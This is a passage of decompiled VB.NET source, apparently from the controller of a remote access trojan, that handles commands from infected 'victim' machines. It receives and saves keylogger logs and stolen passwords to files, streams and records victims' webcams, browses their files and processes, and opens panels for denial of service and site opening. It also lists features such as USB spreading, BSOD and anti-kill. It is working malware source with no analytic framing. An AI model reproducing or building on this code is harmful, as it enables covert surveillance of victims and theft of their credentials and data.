																						flag2 = (Operators.CompareString(left5, "@", False) <> 0)
																						If Not flag2 Then
																							Dim obj6 As Chat = chat
																							SyncLock obj6
																								chat.T1.SelectionStart = chat.T1.TextLength
																								chat.T1.SelectionFont = New Font(chat.T1.Font, FontStyle.Bold)
																								chat.T1.AppendText("Victim : ")
																								chat.T1.SelectionFont = chat.T1.Font
																								chat.T1.AppendText(Class6.smethod_16(array2(3)) + vbCrLf)
																								chat.T1.SelectionStart = chat.T1.TextLength
																								chat.T1.ScrollToCaret()
																								Try
																									Interaction.AppActivate(chat.Text)
																								Catch ex10 As Exception
																								End Try
																							End SyncLock
																						End If
																					End If
																				End If
																			End If
																		Else
																			flag2 = (Operators.CompareString(left, "kla", False) = 0)
																			If flag2 Then
																				Dim kl As kl = CType(Class7.smethod_3("kl" + client.ip()), kl)
																				Dim obj7 As kl = kl
																				SyncLock obj7
																					kl.T1.Clear()
																					Dim array21 As String() = Strings.Split(Class6.smethod_16(array2(1)), vbCrLf, -1, CompareMethod.Binary)
																					kl.ProgressBar1.Value = 0
																					kl.ProgressBar1.Maximum = array21.Length
																					For Each t2 As String In array21
																						kl.insert(t2)
																						Dim progressBar3 As ProgressBar = kl.ProgressBar1
																						progressBar3.Value += 1
																					Next
																					kl.T1.ScrollToCaret()
																					kl.ProgressBar1.Value = 0
																					kl.ToolStripMenuItem1.Enabled = True
																					flag2 = Not Directory.Exists(client.Folder)
																					If flag2 Then
																						Directory.CreateDirectory(client.Folder)
																					End If
																					kl.T1.SaveFile(client.Folder + "Keylog.rtf")
																				End SyncLock
																			Else
																				flag2 = (Operators.CompareString(left, "kl", False) = 0)
																				If flag2 Then
																					flag = Class7.form1_0.InvokeRequired
																					If flag Then
																						Class7.form1_0.Invoke(AddressOf Class7.smethod_5, New Object() { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_0))) })
																					Else
																						flag2 = (Class7.smethod_3("kl" + client.ip()) Is Nothing)
																						If flag2 Then
																							New kl() With { .c = client, .Name = "kl" + client.ip(), .Text = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class7.smethod_1(client.L))) }.Show()
																						End If
																						Dim thread As Thread = AddressOf Class7.smethod_5
																						Dim thread2 As Thread = thread
																						Dim array23 As Object() = New Object(1) {}
																						array23(0) = client
																						Dim array24 As Object() = array23
																						Dim num23 As Integer = 1
																						Dim text4 As String = "kla" + Class7.string_1 + array2(1)
																						array24(num23) = Class6.smethod_11(text4)
																						thread2.Start(array23)
																					End If
																				Else
																					flag2 = (Operators.CompareString(left, "passdata", False) = 0)
																					If flag2 Then
																						Dim pas As pas = CType(Class7.smethod_3("pas" + client.ip()), pas)
																						Dim obj8 As pas = pas
																						SyncLock obj8
																							pas.T1.Clear()
																							Dim array25 As String() = Strings.Split(Class6.smethod_16(array2(1)), vbCrLf, -1, CompareMethod.Binary)
																							pas.ProgressBar1.Value = 0
																							pas.ProgressBar1.Maximum = array25.Length
																							For Each t3 As String In array25
																								pas.insert(t3)
																								Dim progressBar4 As ProgressBar = pas.ProgressBar1
																								progressBar4.Value += 1
																							Next
																							pas.T1.ScrollToCaret()
																							pas.ProgressBar1.Value = 0
																							pas.ToolStripMenuItem1.Enabled = True
																							flag2 = Not Directory.Exists(client.Folder)
																							If flag2 Then
																								Directory.CreateDirectory(client.Folder)
																							End If
																							pas.T1.SaveFile(client.Folder + "Pass.rtf")
																						End SyncLock
																					Else
																						flag2 = (Operators.CompareString(left, "pas", False) = 0)
																						If flag2 Then
																							flag = Class7.form1_0.InvokeRequired
																							If flag Then
																								Class7.form1_0.Invoke(AddressOf Class7.smethod_5, New Object() { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_0))) })
																							Else
																								flag2 = (Class7.smethod_3("pas" + client.ip()) Is Nothing)
																								If flag2 Then
																									New pas() With { .c = client, .Name = "pas" + client.ip(), .Text = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class7.smethod_1(client.L))) }.Show()
																								End If
																								Dim thread3 As Thread = AddressOf Class7.smethod_5
																								Dim thread4 As Thread = thread3
																								Dim array23 As Object() = New Object(1) {}
																								array23(0) = client
																								Dim array27 As Object() = array23
																								Dim num25 As Integer = 1
																								Dim text4 As String = "passdata" + Class7.string_1 + array2(1)
																								array27(num25) = Class6.smethod_11(text4)
																								thread4.Start(array23)
																							End If
																						Else
																							flag2 = (Operators.CompareString(left, "fun", False) = 0)
																							If flag2 Then
																								flag = Class7.form1_0.InvokeRequired
																								If flag Then
																									Class7.form1_0.Invoke(AddressOf Class7.smethod_5, New Object() { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_0))) })
																								Else
																									flag2 = (Class7.smethod_3("fun" + client.ip()) Is Nothing)
																									If flag2 Then
																										New fun() With { .s = client, .Name = "fun" + client.ip(), .Text = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class7.smethod_1(client.L))) }.Show()
																									End If
																									Dim thread5 As Thread = AddressOf Class7.smethod_5
																								End If
																							Else
																								flag2 = (Operators.CompareString(left, "dos", False) = 0)
																								If flag2 Then
																									flag = Class7.form1_0.InvokeRequired
																									If flag Then
																										Class7.form1_0.Invoke(AddressOf Class7.smethod_5, New Object() { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_0))) })
																									Else
																										flag2 = (Class7.smethod_3("dos" + client.ip()) Is Nothing)
																										If flag2 Then
																											New Dos() With { .s = client, .Name = "dos" + client.ip(), .Text = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class7.smethod_1(client.L))) }.Show()
																										End If
																										Dim thread6 As Thread = AddressOf Class7.smethod_5
																									End If
																								Else
																									flag2 = (Operators.CompareString(left, "site", False) = 0)
																									If flag2 Then
																										flag = Class7.form1_0.InvokeRequired
																										If flag Then
																											Class7.form1_0.Invoke(AddressOf Class7.smethod_5, New Object() { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_0))) })
																										Else
																											flag2 = (Class7.smethod_3("site" + client.ip()) Is Nothing)
																											If flag2 Then
																												New OpenSite() With { .s = client, .Name = "site" + client.ip(), .Text = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class7.smethod_1(client.L))) }.Show()
																											End If
																											Dim thread7 As Thread = AddressOf Class7.smethod_5
																										End If
																									Else
																										flag2 = (Operators.CompareString(left, "ret", False) = 0)
																										If flag2 Then
																											flag = Class7.form1_0.InvokeRequired
																											If flag Then
																												Class7.form1_0.Invoke(AddressOf Class7.smethod_5, New Object() { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_0))) })
																											Else
																												flag2 = (Operators.CompareString(array2(1), Class7.smethod_0("pw.dll", Nothing).string_1, False) <> 0)
																												If Not flag2 Then
																													Dim pass As Pass = CType(Class7.smethod_3("Pass"), Pass)
																													flag2 = (pass Is Nothing)
																													If flag2 Then
																														pass = New Pass()
																														pass.Text = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class7.smethod_1(client.L)))
																														pass.Show()
																													End If
																													Dim pass2 As Pass = pass
																													Dim client3 As Client = client
																													Dim text5 As String = Class6.smethod_16(array2(2))
																													Dim text6 As String = text5
																													pass2.XD(client3, text6)
																												End If
																											End If
																										Else
																											flag2 = (Operators.CompareString(left, "inf", False) = 0)
																											If flag2 Then
																												flag = (client.L Is Nothing)
																												If Not flag Then
																													Dim array28 As String() = Strings.Split(Class6.smethod_16(array2(1)), vbCrLf, -1, CompareMethod.Binary)
																													Dim text7 As String = "+++ Server Info"
																													Dim num26 As Integer = 0
																													Dim num27 As Integer = array28.Length - 1
																													For num28 As Integer = num26 To num27
																														text7 = String.Concat(New String() { text7, vbCrLf & "{", Conversions.ToString(num28), "}  ", array28(num28) })
																													Next
																													client.L.Cells(0).ToolTipText = String.Format(text7, New Object() { "Name", "Host", "Dir", "Exe", "Copy", "StartUP F", "StartUp R", "BSOD", "Hidden", "Usb Spread", "Kill Process", "Anti Kill" })
																												End If
																											Else
																												flag2 = (Operators.CompareString(left, "FM", False) = 0)
																												If flag2 Then
																													Dim manager8 As Manager = CType(Class7.smethod_3("m" + client.ip()), Manager)
																													flag2 = (manager8 Is Nothing)
																													If Not flag2 Then
																														Dim left6 As String = array2(1)
																														flag2 = (Operators.CompareString(left6, "!", False) = 0)
																														If flag2 Then
																															manager8.L1.Items.Clear()
																															Dim num29 As Integer = 0
																															Dim list6 As List(Of ListViewItem) = New List(Of ListViewItem)()
																															Dim num30 As Integer = 2
																															Dim num31 As Integer = array2.Length - 1
																															For num32 As Integer = num30 To num31
																																Dim array29 As String() = Strings.Split(Class6.smethod_16(array2(num32)), "*", -1, CompareMethod.Binary)
																																Dim directoryInfo As DirectoryInfo = New DirectoryInfo(array29(0))
																																Dim listViewItem7 As ListViewItem = New ListViewItem(directoryInfo.Name)
																																listViewItem7.ToolTipText = directoryInfo.FullName
																																listViewItem7.SubItems.Add(array29(1))
																																Dim left7 As String = array29(1)
																																flag2 = (Operators.CompareString(left7, DriveType.Fixed.ToString(), False) = 0)
																																If flag2 Then
																																	listViewItem7.ImageIndex = 1
																																Else
																																	flag2 = (Operators.CompareString(left7, DriveType.Removable.ToString(), False) = 0)
																																	If flag2 Then
																																		listViewItem7.ImageIndex = 3
																																	Else
																																		flag2 = (Operators.CompareString(left7, DriveType.CDRom.ToString(), False) = 0)
																																		If flag2 Then
																																			listViewItem7.ImageIndex = 2
																																		Else
																																			flag2 = (Operators.CompareString(left7, String.Empty, False) = 0)
																																			If flag2 Then
																																				listViewItem7.ImageIndex = 0
																																				Select Case num29
																																					Case 0
																																						listViewItem7.Text = "Desktop"
																																					Case 1
																																						listViewItem7.Text = "MyPictures"
																																					Case 2
																																						listViewItem7.Text = "UserProfile"
																																					Case 3
																																						listViewItem7.Text = "StartUp"
																																				End Select
																																				num29 += 1
																																				listViewItem7.SubItems(1).Text = "DIR"
																																			Else
																																				listViewItem7.ImageIndex = If((Operators.CompareString(left7, DriveType.Network.ToString(), False) <> 0), 1, 5)
																																			End If
																																		End If
																																	End If
																																End If
																																list6.Add(listViewItem7)
																																flag2 = (list6.Count > 10)
																																If flag2 Then
																																	manager8.L1.Items.AddRange(list6.ToArray())
																																	list6.Clear()
																																End If
																															Next
																															flag2 = (list6.Count > 0)
																															If flag2 Then
																																manager8.L1.Items.AddRange(list6.ToArray())
																																list6.Clear()
																															End If
																															manager8.L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
																														Else
																															flag2 = (Operators.CompareString(left6, "@", False) = 0)
																															If flag2 Then
																																Dim pr4 As ToolStripProgressBar = manager8.pr
																																SyncLock pr4
																																	flag2 = manager8.Cache.Contains(Class6.smethod_16(array2(2)))
																																	If flag2 Then
																																		manager8.Cache.Remove(Class6.smethod_16(array2(2)))
																																	End If
																																	Dim gclass2 As Manager.GClass14 = New Manager.GClass14()
																																	gclass2.string_0 = Class6.smethod_16(array2(2))
																																	manager8.Cache.Add(gclass2, gclass2.string_0, Nothing, Nothing)
																																	Dim directoryInfo2 As DirectoryInfo = New DirectoryInfo(Class6.smethod_16(array2(2)))
																																	flag2 = (Operators.CompareString(manager8.TextBox1.Text, directoryInfo2.FullName, False) <> 0)
																																	If flag2 Then
																																		gclass2.list_1.Clear()
																																		gclass2.list_0.Clear()
																																		Try
																																			manager8.Cache.Remove(Class6.smethod_16(array2(2)))
																																		Catch ex11 As Exception
																																		End Try
																																	Else
																																		manager8.pr.Value = 0
																																		Dim array30 As String() = Strings.Split(array2(3), "*", -1, CompareMethod.Binary)
																																		manager8.pr.Maximum = array30.Length - 1
																																		manager8.L2.Items.Clear()
																																		flag2 = (directoryInfo2.Parent IsNot Nothing)
																																		If flag2 Then
																																			Dim listViewItem8 As ListViewItem = manager8.L2.Items.Add("..", "..", 0)
																																			listViewItem8.ToolTipText = directoryInfo2.Parent.FullName
																																			listViewItem8.SubItems.Add(String.Empty)
																																			listViewItem8.SubItems.Add("DIR")
																																		End If
																																		manager8.vmethod_108.Images.Clear()
																																		manager8.vmethod_108.Images.Add(manager8.MG.Images(0))
																																		manager8.vmethod_108.Images.Add("*", manager8.MG.Images(4))
																																		Dim list7 As List(Of ListViewItem) = New List(Of ListViewItem)()
																																		Dim num33 As Integer = 0
																																		Dim num34 As Integer = array30.Length - 2
																																		Dim num35 As Integer = num33
																																		While num35 <= num34
																																			flag2 = (Operators.CompareString(manager8.TextBox1.Text, directoryInfo2.FullName, False) = 0)
																																			If flag2 Then
																																				Dim listViewItem9 As ListViewItem = New ListViewItem(Class6.smethod_16(array30(num35)), 0)
																																				Dim listViewItem10 As ListViewItem = listViewItem9
																																				listViewItem10.SubItems.Add(String.Empty)
																																				listViewItem10.SubItems.Add("DIR")
																																				listViewItem10.ToolTipText = directoryInfo2.FullName + listViewItem10.Text
																																				gclass2.list_0.Add(listViewItem10.ToolTipText)
																																				Dim pr5 As ToolStripProgressBar = manager8.pr
																																				pr5.Value += 1
																																				list7.Add(listViewItem9)
																																				flag2 = (list7.Count > 20)
																																				If flag2 Then
																																					manager8.L2.Items.AddRange(list7.ToArray())
																																					list7.Clear()
																																				End If
																																				num35 += 1
																																			Else
																																				gclass2.list_1.Clear()
																																				gclass2.list_0.Clear()
																																				Try
																																					manager8.Cache.Remove(Class6.smethod_16(array2(2)))
																																					Return
																																				Catch ex12 As Exception
																																					Return
																																				End Try
																																			End If
																																		End While
																																		flag2 = (list7.Count > 0)
																																		If flag2 Then
																																			manager8.L2.Items.AddRange(list7.ToArray())
																																			list7.Clear()
																																		End If
																																		manager8.TextBox1.BackColor = Color.Gainsboro
																																		manager8.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
																																		client.Send(String.Concat(New String() { "Ex", Class7.string_1, "fm", Class7.string_1, "@", Class7.string_1, array2(2) }))
																																		manager8.pr.Value = 0
																																	End If
																																End SyncLock
																															Else
																																flag2 = (Operators.CompareString(left6, "#", False) = 0)
																																If flag2 Then
																																	Dim pr6 As ToolStripProgressBar = manager8.pr
																																	SyncLock pr6
																																		Dim text8 As String = Class6.smethod_16(array2(2))
																																		flag2 = (Operators.CompareString(manager8.TextBox1.Text, text8, False) <> 0)
																																		If Not flag2 Then
																																			Dim gclass3 As Manager.GClass14 = CType(manager8.Cache(Class6.smethod_16(array2(2))), Manager.GClass14)
																																			gclass3.list_1.Clear()
																																			manager8.pr.Value = 0
																																			Dim array31 As String() = Strings.Split(array2(3), "*", -1, CompareMethod.Binary)
																																			manager8.pr.Maximum = array31.Length - 1
																																			Dim list8 As List(Of ListViewItem) = New List(Of ListViewItem)()
																																			Dim num36 As Integer = 0
																																			Dim num37 As Integer = array31.Length - 2
																																			Dim num38 As Integer = num36
																																			While num38 <= num37
																																				Dim array32 As String() = Strings.Split(Class6.smethod_16(array31(num38)), "*", -1, CompareMethod.Binary)
																																				flag2 = (Operators.CompareString(manager8.TextBox1.Text, text8, False) = 0)
																																				If flag2 Then
																																					Dim listViewItem11 As ListViewItem = New ListViewItem(array32(0))
																																					Dim listViewItem12 As ListViewItem = listViewItem11
																																					Dim fileInfo As FileInfo = New FileInfo(text8 + array32(0))
																																					listViewItem12.ToolTipText = fileInfo.FullName
																																					listViewItem12.SubItems.Add(Class6.smethod_17(Conversions.ToLong(array32(1))))
																																					listViewItem12.Name = listViewItem12.ToolTipText
																																					flag2 = (array32.Length = 2)
																																					If flag2 Then
																																						flag = (Operators.CompareString(fileInfo.Extension, String.Empty, False) = 0)
																																						If flag Then
																																							listViewItem12.SubItems.Add(String.Empty)
																																							listViewItem12.ImageKey = "*"
																																						Else
																																							listViewItem12.SubItems.Add(fileInfo.Extension.Replace(".", String.Empty))
																																							flag2 = Not manager8.vmethod_108.Images.ContainsKey(fileInfo.Extension)
																																							If flag2 Then
																																								File.Create(Application.StartupPath + "\!" + fileInfo.Extension).Close()
																																								manager8.vmethod_108.Images.Add(fileInfo.Extension, Icon.ExtractAssociatedIcon(Application.StartupPath + "\!" + fileInfo.Extension))
																																								File.Delete(Application.StartupPath + "\!" + fileInfo.Extension)
																																								listViewItem12.ImageKey = fileInfo.Extension
																																							Else
																																								listViewItem12.ImageKey = fileInfo.Extension
																																							End If
																																						End If
																																					Else
																																						listViewItem12.SubItems.Add(fileInfo.Extension.Remove(0, 1))
																																						flag2 = Not manager8.vmethod_108.Images.ContainsKey(listViewItem12.ToolTipText)
																																						If flag2 Then
																																							manager8.vmethod_108.Images.Add(listViewItem12.ToolTipText, Image.FromStream(New MemoryStream(Convert.FromBase64String(array32(2)))))
																																						End If
																																						flag2 = Not manager8.Images.Contains("!" + listViewItem12.ToolTipText)
																																						If flag2 Then
																																							manager8.Images.Add(manager8.vmethod_108.Images(listViewItem12.ToolTipText), "!" + listViewItem12.ToolTipText, Nothing, Nothing)
																																						End If
																																						listViewItem12.ImageKey = listViewItem12.ToolTipText
																																					End If
																																					gclass3.list_1.Add(String.Concat(New String() { listViewItem12.ToolTipText, "*", listViewItem12.SubItems(1).Text, "*", listViewItem12.SubItems(2).Text }))
																																					Dim pr7 As ToolStripProgressBar = manager8.pr
																																					pr7.Value += 1
																																					list8.Add(listViewItem11)
																																					flag2 = (list8.Count > 20)
																																					If flag2 Then
																																						manager8.L2.Items.AddRange(list8.ToArray())
																																						list8.Clear()
																																					End If
																																					num38 += 1
																																				Else
																																					gclass3.list_1.Clear()
																																					gclass3.list_0.Clear()
																																					Try
																																						manager8.Cache.Remove(Class6.smethod_16(array2(2)))
																																						Return
																																					Catch ex13 As Exception
																																						Return
																																					End Try
																																				End If
																																			End While
																																			flag2 = (list8.Count > 0)
																																			If flag2 Then
																																				manager8.L2.Items.AddRange(list8.ToArray())
																																				list8.Clear()
																																			End If
																																			manager8.TextBox1.BackColor = Color.WhiteSmoke
																																			manager8.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
																																			manager8.pr.Value = 0
																																		End If
																																	End SyncLock
																																Else
																																	flag2 = (Operators.CompareString(left6, "$", False) = 0)
																																	If flag2 Then
																																		flag = manager8.Images.Contains(Class6.smethod_16(array2(2)))
																																		If flag Then
																																			manager8.Images.Remove(Class6.smethod_16(array2(2)))
																																		End If
																																		manager8.Images.Add(Image.FromStream(New MemoryStream(CType(NewLateBinding.LateIndexGet(Class6.smethod_9(array, array2(2) + Class7.string_1), New Object() { RuntimeHelpers.GetObjectValue(1) }, Nothing), Byte()))), Class6.smethod_16(array2(2)), Nothing, Nothing)
																																		flag2 = (Not manager8.L2.Items.ContainsKey(Class6.smethod_16(array2(2))) OrElse Not manager8.L2.Items(Class6.smethod_16(array2(2))).Selected)
																																		If Not flag2 Then
																																			manager8.p.Image = CType(manager8.Images(Class6.smethod_16(array2(2))), Image)
																																			manager8.p.Visible = True
																																		End If
																																	Else
																																		flag2 = (Operators.CompareString(left6, "%", False) = 0)
																																		If flag2 Then
																																			flag = Class7.form1_0.InvokeRequired
																																			If flag Then
																																				Class7.form1_0.Invoke(AddressOf Class7.smethod_5, New Object() { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_0))) })
																																			Else
																																				Dim note As Note = New Note()
																																				note.FN = Class6.smethod_16(array2(2))
																																				note.Text = manager8.Text + " - " + note.FN
																																				note.SK = manager8.sk
																																				note.TextBox1.Text = Class6.smethod_16(array2(3)).Replace(vbNullChar, String.Empty)
																																				note.Show()
																																				note.ToolStripMenuItem1.Enabled = False
																																			End If
																																		Else
																																			flag2 = (Operators.CompareString(left6, "dl", False) = 0)
																																			If flag2 Then
																																				Dim array33 As String() = Strings.Split(Class6.smethod_16(array2(2)), "*", -1, CompareMethod.Binary)
																																				Try
																																					Try
																																						For Each obj9 As Object In manager8.L2.Items
																																							Dim listViewItem13 As ListViewItem = CType(obj9, ListViewItem)
																																							flag2 = (Operators.CompareString(array33(1), "!", False) = 0)
																																							If flag2 Then
																																								flag = (Operators.CompareString(listViewItem13.Text, New DirectoryInfo(array33(0)).Name, False) = 0 And Operators.CompareString(listViewItem13.SubItems(2).Text, "DIR", False) = 0)
																																								If flag Then
																																									listViewItem13.Remove()
																																									Exit For
																																								End If
																																							Else
																																								flag2 = (Operators.CompareString(listViewItem13.Text, New DirectoryInfo(array33(0)).Name, False) = 0 And Operators.CompareString(listViewItem13.SubItems(2).Text, "DIR", False) <> 0)
																																								If flag2 Then
																																									listViewItem13.Remove()
																																									Exit For
																																								End If
																																							End If
																																						Next
																																					Finally
																																						Dim enumerator7 As IEnumerator
																																						flag2 = (TypeOf enumerator7 Is IDisposable)
																																						If flag2 Then
																																							TryCast(enumerator7, IDisposable).Dispose()
																																						End If
																																					End Try
																																				Finally
																																					Dim enumerator8 As IEnumerator
																																					flag2 = (TypeOf enumerator8 Is IDisposable)
																																					If flag2 Then
																																						TryCast(enumerator8, IDisposable).Dispose()
																																					End If
																																				End Try
																																			Else
																																				flag2 = (Operators.CompareString(left6, "nm", False) = 0)
																																				If flag2 Then
																																					Dim array34 As String() = Strings.Split(Class6.smethod_16(array2(2)), "*", -1, CompareMethod.Binary)
																																					Try
																																						Try
																																							For Each obj10 As Object In manager8.L2.Items
																																								Dim listViewItem14 As ListViewItem = CType(obj10, ListViewItem)
																																								flag2 = (Operators.CompareString(listViewItem14.ToolTipText, array34(0), False) = 0)
																																								If flag2 Then
																																									flag = (Operators.CompareString(array34(2), "*", False) = 0)
																																									If flag Then
																																										Dim directoryInfo3 As DirectoryInfo = New DirectoryInfo(array34(0))
																																										listViewItem14.Text = array34(1)
																																										listViewItem14.ToolTipText = directoryInfo3.Parent.FullName + "\" + listViewItem14.Text
																																									Else
																																										Dim fileInfo2 As FileInfo = New FileInfo(array34(0))
																																										listViewItem14.Text = array34(1)
																																										listViewItem14.ToolTipText = fileInfo2.Directory.FullName + "\" + listViewItem14.Text
																																										listViewItem14.SubItems(2).Text = New FileInfo(listViewItem14.ToolTipText).Extension.Replace(".", String.Empty)
																																									End If
																																								End If
																																							Next
																																						Finally
																																							Dim enumerator9 As IEnumerator
																																							flag2 = (TypeOf enumerator9 Is IDisposable)
																																							If flag2 Then
																																								TryCast(enumerator9, IDisposable).Dispose()
																																							End If
																																						End Try
																																					Finally
																																						Dim enumerator10 As IEnumerator
																																						flag2 = (TypeOf enumerator10 Is IDisposable)
																																						If flag2 Then
																																							TryCast(enumerator10, IDisposable).Dispose()
																																						End If
																																					End Try
																																				Else
																																					flag2 = (Operators.CompareString(left6, "ER", False) <> 0)
																																					If Not flag2 Then
																																						manager8.SL.Text = array2(3)
																																						flag2 = Not array2(3).StartsWith("UnRAR_")
																																						If Not flag2 Then
																																							Dim pr8 As ToolStripProgressBar = manager8.pr
																																							SyncLock pr8
																																								Dim fileInfo3 As FileInfo = New FileInfo(array2(3))
																																								flag2 = (Operators.CompareString(fileInfo3.Directory.FullName.ToLower() + "\", manager8.TextBox1.Text.ToLower(), False) <> 0)
																																								If Not flag2 Then
																																									Dim listViewItem15 As ListViewItem = manager8.L2.Items.Add(fileInfo3.FullName, fileInfo3.Name, 0)
																																									listViewItem15.SubItems.Add(String.Empty)
																																									listViewItem15.SubItems.Add("DIR")
																																								End If
																																							End SyncLock
																																						End If
																																					End If
																																				End If
																																			End If
																																		End If
																																	End If
																																End If
																															End If
																														End If
																													End If
																												Else
																													flag2 = (Operators.CompareString(left, "CAM", False) = 0)
																													If flag2 Then
																														flag = (client.osk Is Nothing)
																														If flag Then
																															client.isPL = True
																															Try
																																client.osk = Class7.sk_0.GetClient(array2(1))
																															Catch ex14 As Exception
																																client.CN = False
																															End Try
																														End If
																														Dim cam As Cam = CType(Class7.smethod_3("cam" + client.ip()), Cam)
																														Dim left8 As String = array2(2)
																														flag2 = (Operators.CompareString(left8, "~", False) = 0)
																														If flag2 Then
																															flag = (cam Is Nothing)
																															If flag Then
																																Dim flag5 As Boolean = Class7.form1_0.InvokeRequired
																																If flag5 Then
																																	Class7.form1_0.Invoke(AddressOf Class7.smethod_5, New Object() { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_0))) })
																																Else
																																	Dim cam2 As Cam = New Cam()
																																	cam2.sk = client
																																	cam2.osk = client.osk
																																	cam2.Name = "cam" + client.ip()
																																	Dim num39 As Integer = 3
																																	Dim num40 As Integer = array2.Length - 1
																																	For num41 As Integer = num39 To num40
																																		cam2.ComboBox1.SelectedIndex = cam2.ComboBox1.Items.Add(array2(num41))
																																	Next
																																	cam2.Show()
																																End If
																															Else
																																Dim num42 As Integer = 3
																																Dim num43 As Integer = array2.Length - 1
																																For num44 As Integer = num42 To num43
																																	cam.ComboBox1.SelectedIndex = cam.ComboBox1.Items.Add(array2(num44))
																																Next
																															End If
																														Else
																															Dim flag5 As Boolean = Operators.CompareString(left8, "!", False) = 0
																															If flag5 Then
																																flag2 = (cam Is Nothing)
																																If Not flag2 Then
																																	Dim cam3 As Cam = cam
																																	cam3.fps += 1
																																	cam.pkt = array.Length
																																	Thread.Sleep(10)
																																	flag5 = (array2(3).Length = 1)
																																	If Not flag5 Then
																																		Dim image As Image = Image.FromStream(New MemoryStream(CType(NewLateBinding.LateIndexGet(Class6.smethod_9(array, array2(2) + Class7.string_1), New Object() { RuntimeHelpers.GetObjectValue(1) }, Nothing), Byte())))
																																		flag5 = cam.CheckBox3.Checked
																																		If flag5 Then
																																			Try
																																				image.Save(cam.folder + DateAndTime.Now.ToString("yyMMddhhmmssfff") + ".jpg")
																																			Catch ex15 As Exception
																																			End Try
																																		End If
																																		cam.PictureBox1.Image = image
																																	End If
																																End If
																															Else
																																flag5 = (Operators.CompareString(left8, "@", False) <> 0 OrElse cam Is Nothing)
																																If Not flag5 Then
																																	cam.Button1.Text = "Start"
																																End If
																															End If
																														End If
																													Else
																														Dim flag5 As Boolean = Operators.CompareString(left, "proc", False) = 0
																														If flag5 Then
																															Dim manager9 As Manager = CType(Class7.smethod_3("m" + client.ip()), Manager)
																															flag5 = (manager9 Is Nothing)
																															If Not flag5 Then
																																Dim pr9 As ToolStripProgressBar = manager9.pr
																																SyncLock pr9
																																	Dim left9 As String = array2(1)
																																	flag5 = (Operators.CompareString(left9, "pid", False) = 0)
																																	If flag5 Then
																																		manager9.PID = Conversions.ToInteger(array2(2))
																																	Else
																																		flag5 = (Operators.CompareString(left9, "!", False) = 0)
																																		If flag5 Then
																																			Dim obj11 As Manager = manager9
																																			SyncLock obj11
																																				Dim array35 As String() = Strings.Split(array2(2), "[::]", -1, CompareMethod.Binary)
																																				Dim flag6 As Boolean
																																				flag5 = Not Class7.InlineAssignHelper(Of Boolean)(flag6, manager9.LPR.Items.Count = 0)
																																				If flag5 Then
																																					Try
																																						Try
																																							For Each obj12 As Object In manager9.LPR.Items
																																								Dim listViewItem16 As ListViewItem = CType(obj12, ListViewItem)
																																								flag2 = (listViewItem16.ForeColor = Color.GreenYellow)
																																								If flag2 Then
																																									Try
																																										Try
																																											For Each obj13 As Object In listViewItem16.SubItems
																																												Dim listViewSubItem As ListViewItem.ListViewSubItem = CType(obj13, ListViewItem.ListViewSubItem)
																																												listViewSubItem.ForeColor = manager9.LPR.ForeColor
																																											Next
																																										Finally
																																											Dim enumerator12 As IEnumerator
																																											flag5 = (TypeOf enumerator12 Is IDisposable)
																																											If flag5 Then
																																												TryCast(enumerator12, IDisposable).Dispose()
																																											End If
																																										End Try
																																									Finally
																																										Dim enumerator13 As IEnumerator
																																										flag5 = (TypeOf enumerator13 Is IDisposable)
																																										If flag5 Then
																																											TryCast(enumerator13, IDisposable).Dispose()
																																										End If
																																									End Try
																																								End If
																																							Next
																																						Finally
																																							Dim enumerator11 As IEnumerator
																																							flag5 = (TypeOf enumerator11 Is IDisposable)
																																							If flag5 Then
																																								TryCast(enumerator11, IDisposable).Dispose()
																																							End If
																																						End Try
																																					Finally
																																						Dim enumerator14 As IEnumerator
																																						flag5 = (TypeOf enumerator14 Is IDisposable)
																																						If flag5 Then
																																							TryCast(enumerator14, IDisposable).Dispose()
																																						End If
																																					End Try
																																				End If
																																				flag5 = (array35.Length > 1)
																																				If flag5 Then
																																					manager9.pr.Value = 0
																																					manager9.pr.Maximum = array35.Length
																																					Dim list9 As List(Of ListViewItem) = New List(Of ListViewItem)()
																																					For Each text9 As String In array35
																																						Dim array37 As String() = Strings.Split(text9, "[:]", -1, CompareMethod.Binary)
																																						flag5 = (Operators.CompareString(text9, String.Empty, False) <> 0)
																																						If Not flag5 Then
																																							Exit For
																																						End If
																																						flag2 = array37(2).StartsWith("\??\")
																																						If flag2 Then
																																							array37(2) = array37(2).Remove(0, "\??\".Length)
																																						End If
																																						Try
																																							Dim pr10 As ToolStripProgressBar = manager9.pr
																																							pr10.Value += 1
																																						Catch ex16 As Exception
																																						End Try
																																						Dim listViewItem17 As ListViewItem = New ListViewItem(array37(0))
																																						listViewItem17.SubItems.Add(array37(1))
																																						listViewItem17.Name = array37(1)
																																						flag5 = array37(2).Contains(":\")
																																						If flag5 Then
																																							listViewItem17.SubItems.Add(New FileInfo(array37(2).Replace("""", String.Empty)).Directory.Name)
																																							listViewItem17.ToolTipText = array37(2).Replace("""", String.Empty)
																																						Else
																																							listViewItem17.SubItems.Add(String.Empty)
																																						End If
																																						Dim text10 As String = " "
																																						listViewItem17.SubItems.Add(array37(3))
																																						flag5 = array37(4).StartsWith("""")
																																						If flag5 Then
																																							text10 = """"
																																							array37(4) = array37(4).Remove(0, 1)
																																						End If
																																						flag5 = array37(4).Contains(text10)
																																						If flag5 Then
